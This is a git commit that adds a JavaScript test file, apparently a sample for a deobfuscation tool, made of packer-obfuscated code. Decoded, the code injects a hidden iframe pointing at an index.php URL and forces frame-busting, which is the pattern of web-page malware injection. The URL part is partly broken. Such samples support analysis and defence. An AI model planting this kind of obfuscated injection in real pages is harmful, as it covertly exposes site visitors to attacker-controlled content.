880bf9868dfc8fae3236565203b10ac86f0f1bb8
Or Katz <katz3112@gmail.com>
2021-11-24 20:20:19 -0500

    Add files via upload

---
+++ test/mungar_example_with_params_packer_value.js
@@ -0,0 +1,20 @@
+
+eval(function(p, a, c, k, e, r) {
+    e = function(c) {
+        return c.toString(a)
+    };
+    if (!''.replace(/^/, String)) {
+        while (c--) r[e(c)] = k[c] || e(c);
+        k = [function(e) {
+            return r[e]
+        }];
+        e = function() {
+            return '\\w+'
+        };
+        c = 1
+    };
+    while (c--)
+        if (k[c]) p = p.replace(new RegExp('\\b' + e(c) + '\\b', 'g'), k[c]);
+    return p
+}('e 0=1.f(\'0\');0.j.l=\'m\';0.7=\'8.\'+#+\'9.a\';1.b.c(0,d);--></2><2 6="g/h"><!--i(3!=k){3.4.5=4.5}$(1).n(o(){$(\'#p\').q();$(\'#r\').s(\'t\',\'u\')})', 31, 31, 'iframe|document|script|top|location|href|type|src|www|index|php|auisd72iaskduaydsauisd72iaskduaydsauisd72iaskduaydsauisd72iaskduaydsauisd72iaskduaydsauisd72iaskduaydsauisd72iaskduaydsauisd72i|insertBefore|null|var|createElement|text|javascript|if|style|self|display|none|ready|function|ASIujhdyast6672ujashgdty2ujhaystdu2ahgtsd2ujhagtysdu2761tyhasdasd|focus|ajshydt2uaisdyt2gahsydaajshydt2uaisdyt2gahsydaajshydt2uaisdyt2gahsyda|attr|autocomplete|off'.split('|'), 0, {}));
+
